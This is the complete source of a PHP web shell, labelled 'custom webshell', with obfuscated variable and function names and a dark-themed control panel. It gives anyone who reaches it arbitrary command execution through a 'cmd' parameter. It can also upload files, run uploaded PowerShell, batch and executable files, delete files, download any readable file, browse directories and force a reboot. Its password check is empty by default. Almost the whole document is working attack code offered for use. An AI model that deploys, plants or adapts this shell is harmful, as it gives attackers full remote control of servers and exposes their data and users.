<!-- 
#̷𝓍   𝓐𝓡𝓢 𝓢𝓒𝓡𝓘𝓟𝓣𝓤𝓜 
#̷𝓍   custom webshell
-->



<?php $munwrlli1a1dc91c907325c69271ddf0='';global $upkxmwpe868d3cb40d275143fc963b14;global $ooqinpwe020b759adef679a47cb9afe9;if($munwrlli1a1dc91c907325c69271ddf0!=null){if(isset($_COOKIE['pass'])){if(hash('sha512',$_COOKIE['pass'])!==$munwrlli1a1dc91c907325c69271ddf0){echo "Wrong password !";exit;}}else{echo "Wrong password !";exit;}}function Continue588cd121(string $rpzcebvqd6fe1d0be6347b8ef2427fa6):string{$rpzcebvqd6fe1d0be6347b8ef2427fa6=mb_ereg_replace('\\\\|/','/',$rpzcebvqd6fe1d0be6347b8ef2427fa6,'msr');$jkrbyqrn3ff401a37a03fe7c08117faf=$rpzcebvqd6fe1d0be6347b8ef2427fa6[0]==='/';preg_match('/^[a-z]:/',$rpzcebvqd6fe1d0be6347b8ef2427fa6,$xqjrglpr9c28d32df234037773be184d);$wpjjpzpo3ecab05b5b8340f3ad9a85c4=isset($xqjrglpr9c28d32df234037773be184d[0])?$xqjrglpr9c28d32df234037773be184d[0]:false;$cuiitqkjb6a8e8682249b56898e11f47=array_filter(explode('/',$rpzcebvqd6fe1d0be6347b8ef2427fa6),'mb_strlen');$okobevvx81406cf89f2a977dae20d55f=[];foreach($cuiitqkjb6a8e8682249b56898e11f47 as $ooxniute1634b7ef7a71f9ae79c4b3b3){if('.'===$ooxniute1634b7ef7a71f9ae79c4b3b3){continue;}if('..'===$ooxniute1634b7ef7a71f9ae79c4b3b3&&!$jkrbyqrn3ff401a37a03fe7c08117faf&&!$wpjjpzpo3ecab05b5b8340f3ad9a85c4&&empty(array_filter($okobevvx81406cf89f2a977dae20d55f,function($gsbwmgsk2063c1608d6e0baf80249c42){return!('..'===$gsbwmgsk2063c1608d6e0baf80249c42);}))){$okobevvx81406cf89f2a977dae20d55f[]=$ooxniute1634b7ef7a71f9ae79c4b3b3;continue;}if('..'===$ooxniute1634b7ef7a71f9ae79c4b3b3){array_pop($okobevvx81406cf89f2a977dae20d55f);continue;}$okobevvx81406cf89f2a977dae20d55f[]=$ooxniute1634b7ef7a71f9ae79c4b3b3;}return(($jkrbyqrn3ff401a37a03fe7c08117faf?'/':$wpjjpzpo3ecab05b5b8340f3ad9a85c4)?$wpjjpzpo3ecab05b5b8340f3ad9a85c4.'/':'').implode('/',$okobevvx81406cf89f2a977dae20d55f);}if(isset($_POST['upload'])){$mhvtbdyr14402cfaa3089ce288adfbda=Reportca6accb7();$mcbiariv87f85f26c826cf7ccb2ae98b=$mhvtbdyr14402cfaa3089ce288adfbda.'/'.basename($_FILES['file']['name']);if(file_exists($mcbiariv87f85f26c826cf7ccb2ae98b)){echo "<script>alert('Error: File already exists !')</script>";}else if(move_uploaded_file($_FILES['file']['tmp_name'],$mcbiariv87f85f26c826cf7ccb2ae98b)){echo "<script>alert('File uploaded successfuly !')</script>";}else{echo "<script>alert('Error: Could not upload file !')</script>";}}else if(isset($_GET['runscript'])){$egjmshmo3205c0ded576131ea255ad2b=$_GET['runscript'];$oarrwpok0d858590b2752462cbbd205a=Continue588cd121($egjmshmo3205c0ded576131ea255ad2b);$plrlqvjb1dccadfed7bcbb036c56a4af='pwsh -Noni -Nop -File "'.$oarrwpok0d858590b2752462cbbd205a.'"';global $upkxmwpe868d3cb40d275143fc963b14;global $ooqinpwe020b759adef679a47cb9afe9;$upkxmwpe868d3cb40d275143fc963b14=shell_exec($plrlqvjb1dccadfed7bcbb036c56a4af);}else if(isset($_GET['runexe'])){$egjmshmo3205c0ded576131ea255ad2b=$_GET['runexe'];$oarrwpok0d858590b2752462cbbd205a=Continue588cd121($egjmshmo3205c0ded576131ea255ad2b);$plrlqvjb1dccadfed7bcbb036c56a4af=$oarrwpok0d858590b2752462cbbd205a;exec('cd '.realpath(Reportca6accb7()).' && '.$oarrwpok0d858590b2752462cbbd205a,$upkxmwpe868d3cb40d275143fc963b14,$ooqinpwe020b759adef679a47cb9afe9);}else if(isset($_GET['runbat'])){$egjmshmo3205c0ded576131ea255ad2b=$_GET['runbat'];$oarrwpok0d858590b2752462cbbd205a=Continue588cd121($egjmshmo3205c0ded576131ea255ad2b);$plrlqvjb1dccadfed7bcbb036c56a4af='pwsh -Noni -Nop -Command { Start-Process "cmd.exe" -ArgumentList @("/k","'.$oarrwpok0d858590b2752462cbbd205a.') }';exec('cd '.realpath(Reportca6accb7()).' && '.$oarrwpok0d858590b2752462cbbd205a,$upkxmwpe868d3cb40d275143fc963b14,$ooqinpwe020b759adef679a47cb9afe9);}else if(isset($_GET['delete'])){$egjmshmo3205c0ded576131ea255ad2b=$_GET['delete'];$oarrwpok0d858590b2752462cbbd205a=Continue588cd121($egjmshmo3205c0ded576131ea255ad2b);$plrlqvjb1dccadfed7bcbb036c56a4af='pwsh -Noni -Nop -Command "& { Write-Output "Deleting file "'.$oarrwpok0d858590b2752462cbbd205a.'"; $Null = Remove-Item -Path "'.$oarrwpok0d858590b2752462cbbd205a.'" -Force -ErrorAction Ignore }"';global $upkxmwpe868d3cb40d275143fc963b14;global $ooqinpwe020b759adef679a47cb9afe9;$upkxmwpe868d3cb40d275143fc963b14[0]=shell_exec($plrlqvjb1dccadfed7bcbb036c56a4af);}else if(isset($_GET['quickaction'])){$aaaalqdc418c5509e2171d55b0aee5c2=$_GET['quickaction'];switch($aaaalqdc418c5509e2171d55b0aee5c2){case "restart":$plrlqvjb1dccadfed7bcbb036c56a4af='pwsh -noni -nop -Command "& {Restart-Computer -Force}"';$upkxmwpe868d3cb40d275143fc963b14=shell_exec($plrlqvjb1dccadfed7bcbb036c56a4af);break;default:break;}}if(isset($_GET['download'])){$ccbnoqxu8c7dd922ad47494fc02c388e=$_GET['download'];if(file_exists($ccbnoqxu8c7dd922ad47494fc02c388e)){if(is_readable($ccbnoqxu8c7dd922ad47494fc02c388e)){header('Content-Description: File Transfer');header('Content-Type: application/octet-stream');header('Content-Disposition: attachment; filename="'.basename($ccbnoqxu8c7dd922ad47494fc02c388e).'"');header('Expires: 0');header('Cache-Control: must-revalidate');header('Pragma: public');header('Content-Length: '.filesize($ccbnoqxu8c7dd922ad47494fc02c388e));readfile($ccbnoqxu8c7dd922ad47494fc02c388e);exit;}else{echo "<script>alert('Error: Could not read the file !')</script>";exit;}}}function Carec7f2ef29(){return 'rgb(32, 0, 128)';}function Understand9bca1e42(){return '#00ff00';}function Cut3738d06e(){return '#d92626';}function Relax48961a03(){return '#d0d0d0';}function Irona419936d(){return '#ff0066';}function Counter1dbe546a(){return '#3ADF00';}function Determine918b367e(){return '#3ADF00';}function Reportca6accb7ectoryColor(){return '#3ADF00';}function Justify8c37ac75(){return '#ff5500';}function Ratee9a77118(){return '#C0C0C0';}function Permitf23db05c(){return '#C0C0C0';}function Test000a4122(){return '#3ADF00';}function Watche365d5ae($mxtouvxsc9e9a848920877e76685b2e4){switch($mxtouvxsc9e9a848920877e76685b2e4){case 1:return '#101010';break;case 2:return '#202020';break;case 3:return '#303030';break;case 4:return '#404040';break;default:return '#404040';}return '#404040';}function Begin6cfb647a($djlxvhvzb068931cc450442b63f5b3d2){$dpfoxucv7b8b965ad4bca0e41ab51de7=strrpos($djlxvhvzb068931cc450442b63f5b3d2,'.');return($dpfoxucv7b8b965ad4bca0e41ab51de7===false)?'':substr($djlxvhvzb068931cc450442b63f5b3d2,$dpfoxucv7b8b965ad4bca0e41ab51de7+1);}function Introduce0e436eab($elelnabe435ed7e9f07f740abf511a62){$ooqinpwe020b759adef679a47cb9afe9='';$eqdabqpta3da707b651c79ecc39a4986=Reportca6accb7().'/'.$elelnabe435ed7e9f07f740abf511a62;if(is_dir($eqdabqpta3da707b651c79ecc39a4986)){$ooqinpwe020b759adef679a47cb9afe9.='<td style="color: "'.Reportca6accb7ectoryColor().'">';$ooqinpwe020b759adef679a47cb9afe9.=htmlspecialchars('<dir>');}else{$ooqinpwe020b759adef679a47cb9afe9.='<td style="color: "'.Cut3738d06e().'">';$merbuyvi93d565f07a1ee62504ba94b6=Log76e3a9cf(filesize($eqdabqpta3da707b651c79ecc39a4986));$ooqinpwe020b759adef679a47cb9afe9.=$merbuyvi93d565f07a1ee62504ba94b6;}$ooqinpwe020b759adef679a47cb9afe9.='</td>';return $ooqinpwe020b759adef679a47cb9afe9;}function Prepareb2ca3053($elelnabe435ed7e9f07f740abf511a62){$ooqinpwe020b759adef679a47cb9afe9='';$hydqgscyabf77184f55403d75b9d51d7=pathinfo($elelnabe435ed7e9f07f740abf511a62,PATHINFO_EXTENSION);$ooqinpwe020b759adef679a47cb9afe9.='<td style="color: "'.Relax48961a03().'"> n/a </td>';return $ooqinpwe020b759adef679a47cb9afe9;}function Impact432358c3($elelnabe435ed7e9f07f740abf511a62){$ooqinpwe020b759adef679a47cb9afe9='';$hydqgscyabf77184f55403d75b9d51d7=pathinfo($elelnabe435ed7e9f07f740abf511a62,PATHINFO_EXTENSION);if(is_dir($elelnabe435ed7e9f07f740abf511a62)){echo"\n<!-- DEBUG $elelnabe435ed7e9f07f740abf511a62 isaDir TRUE -->\n";$ooqinpwe020b759adef679a47cb9afe9.='<td style="color: "'.Cut3738d06e().'">';$ooqinpwe020b759adef679a47cb9afe9.=Base014b9ec3($elelnabe435ed7e9f07f740abf511a62);}else{echo"\n<!-- DEBUG $elelnabe435ed7e9f07f740abf511a62 isaDir FALSE -->\n";$ooqinpwe020b759adef679a47cb9afe9.='<td style="color: "'.Cut3738d06e().'">';$ooqinpwe020b759adef679a47cb9afe9.=Knit2f3dc02b($elelnabe435ed7e9f07f740abf511a62);}switch($hydqgscyabf77184f55403d75b9d51d7){case "ps1":$ooqinpwe020b759adef679a47cb9afe9.=Provide637989cf($elelnabe435ed7e9f07f740abf511a62);break;case "bat":$ooqinpwe020b759adef679a47cb9afe9.=Checkab1e741c($elelnabe435ed7e9f07f740abf511a62);break;case "exe":$ooqinpwe020b759adef679a47cb9afe9.=Visitac2688e0($elelnabe435ed7e9f07f740abf511a62);break;default:}$ooqinpwe020b759adef679a47cb9afe9.='</td>';return $ooqinpwe020b759adef679a47cb9afe9;}function Send3fbf1c1b($ccbnoqxu8c7dd922ad47494fc02c388e){$febpumxf15d61712450a686a7f365adf=fileperms($ccbnoqxu8c7dd922ad47494fc02c388e);if($febpumxf15d61712450a686a7f365adf&0x1000){$mqepvmjc599dcce2998a6b40b1e38e8c='p';}else if($febpumxf15d61712450a686a7f365adf&0x2000){$mqepvmjc599dcce2998a6b40b1e38e8c='c';}else if($febpumxf15d61712450a686a7f365adf&0x4000){$mqepvmjc599dcce2998a6b40b1e38e8c='d';}else if($febpumxf15d61712450a686a7f365adf&0x6000){$mqepvmjc599dcce2998a6b40b1e38e8c='b';}else if($febpumxf15d61712450a686a7f365adf&0x8000){$mqepvmjc599dcce2998a6b40b1e38e8c='-';}else if($febpumxf15d61712450a686a7f365adf&0xA000){$mqepvmjc599dcce2998a6b40b1e38e8c='l';}else if($febpumxf15d61712450a686a7f365adf&0xC000){$mqepvmjc599dcce2998a6b40b1e38e8c='s';}else $mqepvmjc599dcce2998a6b40b1e38e8c='u';$yiezdtxf72122ce96bfec66e2396d2e2["read"]=($febpumxf15d61712450a686a7f365adf&00400)?'r':'-';$yiezdtxf72122ce96bfec66e2396d2e2["write"]=($febpumxf15d61712450a686a7f365adf&00200)?'w':'-';$yiezdtxf72122ce96bfec66e2396d2e2["execute"]=($febpumxf15d61712450a686a7f365adf&00100)?'x':'-';$zagxxwwrdb0f6f37ebeb6ea094891243["read"]=($febpumxf15d61712450a686a7f365adf&00040)?'r':'-';$zagxxwwrdb0f6f37ebeb6ea094891243["write"]=($febpumxf15d61712450a686a7f365adf&00020)?'w':'-';$zagxxwwrdb0f6f37ebeb6ea094891243["execute"]=($febpumxf15d61712450a686a7f365adf&00010)?'x':'-';$telrktgp7d793037a0760186574b0282["read"]=($febpumxf15d61712450a686a7f365adf&00004)?'r':'-';$telrktgp7d793037a0760186574b0282["write"]=($febpumxf15d61712450a686a7f365adf&00002)?'w':'-';$telrktgp7d793037a0760186574b0282["execute"]=($febpumxf15d61712450a686a7f365adf&00001)?'x':'-';if($febpumxf15d61712450a686a7f365adf&0x800)$yiezdtxf72122ce96bfec66e2396d2e2["execute"]=($yiezdtxf72122ce96bfec66e2396d2e2['execute']=='x')?'s':'S';if($febpumxf15d61712450a686a7f365adf&0x400)$zagxxwwrdb0f6f37ebeb6ea094891243["execute"]=($zagxxwwrdb0f6f37ebeb6ea094891243['execute']=='x')?'s':'S';if($febpumxf15d61712450a686a7f365adf&0x200)$telrktgp7d793037a0760186574b0282["execute"]=($telrktgp7d793037a0760186574b0282['execute']=='x')?'t':'T';$mvnbirbg03c7c0ace395d80182db07ae=sprintf("%1s",$mqepvmjc599dcce2998a6b40b1e38e8c);$mvnbirbg03c7c0ace395d80182db07ae.=sprintf("%1s%1s%1s",$yiezdtxf72122ce96bfec66e2396d2e2['read'],$yiezdtxf72122ce96bfec66e2396d2e2['write'],$yiezdtxf72122ce96bfec66e2396d2e2['execute']);$mvnbirbg03c7c0ace395d80182db07ae.=sprintf("%1s%1s%1s",$zagxxwwrdb0f6f37ebeb6ea094891243['read'],$zagxxwwrdb0f6f37ebeb6ea094891243['write'],$zagxxwwrdb0f6f37ebeb6ea094891243['execute']);$mvnbirbg03c7c0ace395d80182db07ae.=sprintf("%1s%1s%1s",$telrktgp7d793037a0760186574b0282['read'],$telrktgp7d793037a0760186574b0282['write'],$telrktgp7d793037a0760186574b0282['execute']);return $mvnbirbg03c7c0ace395d80182db07ae;}function Log76e3a9cf($rhjasaai4b3a6218bb3e3a7303e8a171){if($rhjasaai4b3a6218bb3e3a7303e8a171>=1073741824){$rhjasaai4b3a6218bb3e3a7303e8a171=number_format($rhjasaai4b3a6218bb3e3a7303e8a171/1073741824,2).' GB';}elseif($rhjasaai4b3a6218bb3e3a7303e8a171>=1048576){$rhjasaai4b3a6218bb3e3a7303e8a171=number_format($rhjasaai4b3a6218bb3e3a7303e8a171/1048576,2).' MB';}elseif($rhjasaai4b3a6218bb3e3a7303e8a171>=1024){$rhjasaai4b3a6218bb3e3a7303e8a171=number_format($rhjasaai4b3a6218bb3e3a7303e8a171/1024,2).' KB';}elseif($rhjasaai4b3a6218bb3e3a7303e8a171>1){$rhjasaai4b3a6218bb3e3a7303e8a171=$rhjasaai4b3a6218bb3e3a7303e8a171.' bytes';}elseif($rhjasaai4b3a6218bb3e3a7303e8a171==1){$rhjasaai4b3a6218bb3e3a7303e8a171=$rhjasaai4b3a6218bb3e3a7303e8a171.' byte';}else{$rhjasaai4b3a6218bb3e3a7303e8a171='0 bytes';}return $rhjasaai4b3a6218bb3e3a7303e8a171;}function Reportca6accb7(){return isset($_GET['dir'])?realpath($_GET['dir']):getcwd();}function Refuse174751df($ccbnoqxu8c7dd922ad47494fc02c388e){if(is_dir(Reportca6accb7().'/'.$ccbnoqxu8c7dd922ad47494fc02c388e)){return '<a href="'.$_SERVER['PHP_SELF'].'?dir='.realpath(Reportca6accb7().'/'.$ccbnoqxu8c7dd922ad47494fc02c388e).'">'.$ccbnoqxu8c7dd922ad47494fc02c388e.'</a>';}else{return '<a href="'.$_SERVER['PHP_SELF'].'?download='.realpath(Reportca6accb7().'/'.$ccbnoqxu8c7dd922ad47494fc02c388e).'">'.$ccbnoqxu8c7dd922ad47494fc02c388e.'</a>';}}function Provide637989cf($ccbnoqxu8c7dd922ad47494fc02c388e){return '<a href="'.$_SERVER['PHP_SELF'].'?runscript='.Continue588cd121(Reportca6accb7().'/'.$ccbnoqxu8c7dd922ad47494fc02c388e).'&dir='.realpath(Reportca6accb7()).'">'.'run </a>';}function Visitac2688e0($ccbnoqxu8c7dd922ad47494fc02c388e){return '<a href="'.$_SERVER['PHP_SELF'].'?runexe='.Continue588cd121(Reportca6accb7().'/'.$ccbnoqxu8c7dd922ad47494fc02c388e).'&dir='.realpath(Reportca6accb7()).'">'.'run </a>';}function Knit2f3dc02b($ccbnoqxu8c7dd922ad47494fc02c388e){return '<a href="'.$_SERVER['PHP_SELF'].'?delete='.Continue588cd121(Reportca6accb7().'/'.$ccbnoqxu8c7dd922ad47494fc02c388e).'&dir='.realpath(Reportca6accb7()).'">'.'del </a>';}function Checkab1e741c($ccbnoqxu8c7dd922ad47494fc02c388e){return '<a href="'.$_SERVER['PHP_SELF'].'?runbat='.Continue588cd121(Reportca6accb7().'/'.$ccbnoqxu8c7dd922ad47494fc02c388e).'&dir='.realpath(Reportca6accb7()).'">'.'run </a>';}function Base014b9ec3($ccbnoqxu8c7dd922ad47494fc02c388e){return '<a href="'.$_SERVER['PHP_SELF'].'?zipdir='.Continue588cd121(Reportca6accb7().'/'.$ccbnoqxu8c7dd922ad47494fc02c388e).'&dir='.realpath(Reportca6accb7()).'">'.'zip </a>';}function Judgee5200a93(){$ozcbrtxf45b963397aa40d4a0063e0d8=scandir(Reportca6accb7());$tjcxepitcc935c5faf4c8f7a0468d755=true;if($ozcbrtxf45b963397aa40d4a0063e0d8!=null){foreach($ozcbrtxf45b963397aa40d4a0063e0d8 as $elelnabe435ed7e9f07f740abf511a62){echo '<tr style="background-color:'.($tjcxepitcc935c5faf4c8f7a0468d755?'#515151':'#212121').';">';echo '<td style="font-weight:thin;">'.Refuse174751df($elelnabe435ed7e9f07f740abf511a62).'</td>';$eedynrvg8b0afb238c3cd824b61190b7=Reportca6accb7().'/'.$elelnabe435ed7e9f07f740abf511a62;if(is_dir($eedynrvg8b0afb238c3cd824b61190b7)){$eedynrvg8b0afb238c3cd824b61190b7=Reportca6accb7().'/'.$elelnabe435ed7e9f07f740abf511a62;}else{$eedynrvg8b0afb238c3cd824b61190b7=$elelnabe435ed7e9f07f740abf511a62;}echo ''.Introduce0e436eab($elelnabe435ed7e9f07f740abf511a62).'';if($elelnabe435ed7e9f07f740abf511a62=='..'||$elelnabe435ed7e9f07f740abf511a62=='.'){echo ''.Prepareb2ca3053($eedynrvg8b0afb238c3cd824b61190b7).'';}else{echo ''.Impact432358c3($eedynrvg8b0afb238c3cd824b61190b7).'';}echo '</tr>';$tjcxepitcc935c5faf4c8f7a0468d755=!$tjcxepitcc935c5faf4c8f7a0468d755;}}else{echo "<p>Couldn't open that directory !";}}function Prided76e40de(){global $upkxmwpe868d3cb40d275143fc963b14;global $ooqinpwe020b759adef679a47cb9afe9;if($ooqinpwe020b759adef679a47cb9afe9==0){if($upkxmwpe868d3cb40d275143fc963b14!=null){foreach($upkxmwpe868d3cb40d275143fc963b14 as $omgwpmqv6438c669e0d0de98e6929c2c){if($omgwpmqv6438c669e0d0de98e6929c2c!=null){echo "<br>";echo htmlspecialchars($omgwpmqv6438c669e0d0de98e6929c2c);echo "\n";}}}}else{echo "Execution failed with error code: ".$ooqinpwe020b759adef679a47cb9afe9;}}function Perform9639d60a(){$fgoelurm0897acf49c7c1ea9f76efe59=gethostname()?? 'none';$ojciwpdh14c4b06b824ec59323936251=get_current_user();$vhixzuat736007832d2167baaae763fd=Reportca6accb7();$qygwhedydfff0a7fa1a55c8c1a4966c1=isset($_GET['cmd'])?$_GET['cmd']:'';return '<span style="color: #ff6347">'.$ojciwpdh14c4b06b824ec59323936251.'@'.$fgoelurm0897acf49c7c1ea9f76efe59.'</span>: <span style="color: #B40404">'.$vhixzuat736007832d2167baaae763fd.'</span>$ '.$qygwhedydfff0a7fa1a55c8c1a4966c1;}if(isset($_GET['cmd'])){exec('cd '.realpath(Reportca6accb7()).' && '.$_GET['cmd'],$upkxmwpe868d3cb40d275143fc963b14,$ooqinpwe020b759adef679a47cb9afe9);}?>

<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <title>My WebShell</title>
        
        <script>
            function Warn69aed42f() {
                const url = '<?php echo $_SERVER['PHP_SELF'].'?dir='?>';
                const path = window.prompt("Enter the path you want to naviguate to (Eg: '/home/user'): ");

                if (path) window.location = (url + path);
            }
            function War5ef05070() {
                const url = '<?php echo $_SERVER['PHP_SELF'].'?dir='?>';
                const path = window.prompt("Enter the path you want to naviguate to (Eg: '/home/user'): ");

                if (path) window.location = (url + path);
            }
        </script>
        <style>
            :root {
                --header-color: <?php echo Carec7f2ef29();?>;
                --background-color-1: <?php echo Watche365d5ae(1);?>;
                --background-color-2: <?php echo Watche365d5ae(2);?>;
                --background-color-3: <?php echo Watche365d5ae(3);?>;
                --background-color-4: <?php echo Watche365d5ae(4);?>;
                --primary-color: <?php echo Understand9bca1e42();?>;
                --secondary-color: <?php echo Cut3738d06e();?>;
                --command-color: <?php echo Irona419936d();?>;
                --commandoutput-color: <?php echo Counter1dbe546a();?>;
                --explorer-color: <?php echo Determine918b367e();?>;
                --directory-color: <?php echo Reportca6accb7ectoryColor();?>;
                --navtext-color: <?php echo Justify8c37ac75();?>;
                --navtext-hover-color: <?php echo Permitf23db05c();?>;
                --header-text-color: <?php echo Ratee9a77118();?>;
                --buttons-color: <?php echo Test000a4122();?>;
            }
        </style>
        <script>
            const popupHtmlConfirm = `
                <div class="popup-container" id="upload-popup">
                    <div class="popup">
                        <h4>HARD REBOOT OF COMPUTER RIGHT NOW!</h4>
                        <form action="<?php echo $_SERVER['PHP_SELF'].'?dir='.Reportca6accb7().'&quickaction=restart' ?>" method="POST" enctype="multipart/form-data">
                            <div class="popup-buttons">
                                <button type="button" onclick="Rush9981b12c()">Cancel</button>
                                <input type="submit" value="confirm" name="confirm">
                            </div>
                        </form>
                    </div>
                </div>
            `;
            const popupHtmlUploadFile = `
                <div class="popup-container" id="upload-popup">
                    <div class="popup">
                        <h4>Choose a file to upload</h4>
                        <form action="<?php echo $_SERVER['PHP_SELF'].'?dir='.Reportca6accb7()?>" method="POST" enctype="multipart/form-data">
                            <input type="file" name='file' id='file' required>
                            <div class="popup-buttons">
                                <button type="button" onclick="Rush9981b12c()">Cancel</button>
                                <input type="submit" value="Upload" name="upload">
                            </div>
                        </form>
                    </div>
                </div>
            `;
            const popupHtmlRunPowerShellScript = `
                <div class="popup-container" id="upload-popup">
                    <div class="popup">
                        <h4>Choose a script to run...</h4>
                        <form action="<?php echo $_SERVER['PHP_SELF'].'?dir='.Reportca6accb7()?>" method="POST" enctype="multipart/form-data">
                            <input type="file" name='file' id='file' required>
                            <div class="popup-buttons">
                                <button type="button" onclick="Rush9981b12c()">Cancel</button>
                                <input type="submit" value="runpwsh" name="runpwsh">
                            </div>
                        </form>
                    </div>
                </div>
            `;
            function Pause3ffa1185(newLocation)
            {
                window.location = newLocation;
                return false;
            }
            function Guess2255d7c9() {
                const body = document.getElementsByTagName('body')[0];
                const bodyHTML = body.innerHTML;

                body.innerHTML = popupHtmlConfirm + bodyHTML;
            }
            function Existdf466830() {
                const body = document.getElementsByTagName('body')[0];
                const bodyHTML = body.innerHTML;

                body.innerHTML = popupHtmlUploadFile + bodyHTML;
            }
            function Smile1bdaf123() {
                const body = document.getElementsByTagName('body')[0];
                const bodyHTML = body.innerHTML;

                body.innerHTML = popupHtmlRunPowerShellScript + bodyHTML;
            }
            function Rush9981b12c() {
                const body = document.getElementsByTagName('body')[0];
                body.removeChild(body.getElementsByClassName('popup-container')[0]); 
            }
        </script>
    </head>
    <body class="body-container">   
        <header>
            <nav>
                <h1><?php echo $_SERVER['HTTP_HOST']; ?> >> control panel </h1>
                <div class="nav-items">
                	<a onclick="Guess2255d7c9()">[restart now]</a>
                    <a onclick="Existdf466830()">[upload]</a>
                    <a onclick="Warn69aed42f()">[cd]</a>
                </div>
            </nav>
        </header>
        <div class="content-container">
            <div class="explorer-panel">
                <h4>Exploring: <?php echo Reportca6accb7()?></h4>
                <table>
                    <tr style="background-color:var(--header-color);">
                        <th>Folder / <span style="font-weight: lighter;">File</span></th>
                        <!--<th>Owner</th>
                        //<th>Permissions</th> -->
                        <th>Size</th>
                        <th>Actions</th>
                    </tr>
                    <?php Judgee5200a93()?>
                </table>
            </div>
            <div class="command-panel">
                <div class="command-output">
                    <p><?php echo Perform9639d60a()?></p>
                    <p><?php Prided76e40de()?></p>
                </div>
                <form id="command-input" action="<?php echo $_SERVER['PHP_SELF']?>" method="get">
                    <input type="text" name="cmd">
                    <input type="hidden" name="dir" value="<?php echo Reportca6accb7()?>"/>
                    <button action="submit">
                        <p>Send</p>
                    </button>
                </form>
            </div>
        </div>
        <style>



            html, body {
                width: 100%;
                height: 100%;
                margin: 0;
                padding: 0;
                background-color: var(--background-color-2);
                
            }

            .body-container {
                display: grid;
                grid-template-rows: 50px calc(100% - 50px);
            }

            header {
                z-index:1;
                background-color: var(--header-color);
                box-shadow: 0px 2px 6px black;
            }

            header nav {
                height: 100%;
                display: flex;
                justify-content: flex-start;     
                color: var(--header-text-color);
                font-family: 'Consolas', monospace;
            }

            header h1 {
                height: 100%;
                margin: 0;
                margin-left: 20px;
                text-align: center;
                line-height: 50px;
                font-size: 24px;
            }

            header .nav-items {
                height: 100%;
                width: auto;
                margin: 0;
                display: flex;
                flex-grow: 1;
                justify-content: flex-end;
            }

            header .nav-items a {
                height: 100%;
                margin-right: 30px;
                color: var(--navtext-color);
                font-size: 12px;
                text-decoration: none;
                line-height: 50px;
                text-align:center;
                transition: ease-in 0.2s;     
            }

            header .nav-items a:hover {
                color:  var(--navtext-hover-color);
                cursor: pointer;
            }

            .content-container {
                height: 100%;
                position: relative;
                display: grid;
                grid-template-columns: 30% 70%;      
                color:  rgb(0, 128, 255);
                font-family: 'Consolas', monospace;
            }

            .explorer-panel {
                background-color: var(--background-color-3);
                color: var(--explorer-color);
                font-family: 'Consolas', monospace;
                overflow-y: scroll;
                scrollbar-color: var(--background-color-4) var(--background-color-3);
                scrollbar-width: thin;
                box-shadow: 0px 0px 4px black;
                padding: 3px;
            }

            .explorer-panel h4 {
                margin: 10px;
                font-size: 12px;
                color: var(--explorer-color);
            }

            .explorer-panel table {font-size
                width: 100%;
                word-wrap: break-word;
                border-spacing: 2px;
                table-layout: auto;
                color: hsl(30, 100%, 50%);
                background-color: var(--background-color-2);
                font-size: 12px;
            }

            .explorer-panel table td {
                padding: 1px 2px;
            }

            .explorer-panel table a {
                color: var(--primary-color);
                text-decoration: none;         
            }

            .explorer-panel table a:hover {
                color: var(--secondary-color);
                transition: ease 0.2s;
                font-size: 12px;
            }

            .command-panel {    
                margin: 20px;
                padding: 15px;
                border-radius: 5px;
                color: var(--command-color);
                background-color: var(--background-color-3);
                display: grid;
                grid-template-rows: 93% calc(7% - 15px);
                row-gap: 15px;
                box-shadow: 0px 0px 6px black;
                font-size: 8px;
            }

            .command-output {
                padding: 5px;
                border-radius: 5px;
                background-color: var(--background-color-1);              
                overflow-y: scroll;
                scrollbar-color: var(--background-color-4) var(--background-color-3);
                scrollbar-width: thin;
                font-family: 'Consolas', monospace;
                color: var(--commandoutput-color);
            }

            .command-output p {
                margin: 0px;
                font-family: 'Consolas', monospace;
            }

            #command-input {
                display: grid;
                grid-template-columns: 89% 10%;
                grid-template-rows: 100%;
                column-gap: 1%;
            }

            #command-input input{
                height: 100%;
                width: 100%;
                border-radius: 5px;
                border: none;
                background-color: var(--background-color-2);        
                color: var(--command-color);
                font-size: 12px;
            }

            #command-input button{
                height: 100%;
                width: 100%;
                border: none;
                border-radius: 5px;
                background-color: var(--background-color-4);  
                cursor: pointer;
            }

            #command-input button:hover{
                background-color: var(--primary-color);
                transition: ease-in-out 0.3s;
            }

            #command-input button p{
                margin:0;
                color: var(--buttons-color);
                font-family: 'Consolas', monospace;
                font-size: 12px;
                font-weight: bolder;
                line-height: 100%;
            }


            .popup-container {
                z-index: 5;
                position: fixed;
                background-color: rgba(10,10,10, 0.6);
                width: 100%;
                height: 100%;
                display: grid;
                justify-content: center;
                align-content: center;
                grid-template-columns: 30%;
                grid-template-rows: 35%;
            }

            .popup {
                background-color: var(--background-color-3);
                border-radius: 5px;
                box-shadow: 0px 2px 6px black;
                display: grid;
                grid-template-rows: 20% 70%;
                row-gap: 10%;
                padding: 2.5%;
            }

            .popup h4{
                text-align: center;
                font-family: 'Consolas', monospace;
                font-size: 12px;
            }

            .popup form {
                display: grid;
                grid-template-rows: 80% 20%;
                grid-template-columns: 95%;
                justify-content: center;
                align-content: center;
            }

            .popup-buttons {
                height: 100%;
                display: inline-flex;
                flex-wrap: wrap;
                gap: 10%;
            }

            .popup-buttons button {
                width: 45%;
                background-color: var(--background-color-4);
                border-radius: 4px;;
                border: none;
                font-size: 22px;
                color: var(--buttons-color);
                transition: ease-in 0.2s;
            }

            .popup-buttons button:hover {
                background-color: var(--background-color-2);
                cursor: pointer;            
            }

            .popup-buttons input {
                width: 45%;
                background-color: var(--primary-color);
                border-radius: 4px;;
                border: none;
                font-size: 22px;
                color: var(--buttons-color);
                transition: ease-in 0.2s;
            }

            .popup-buttons input:hover {
                background-color: var(--secondary-color);
                cursor: pointer; 
            }
        </style>
    </body>
</html>





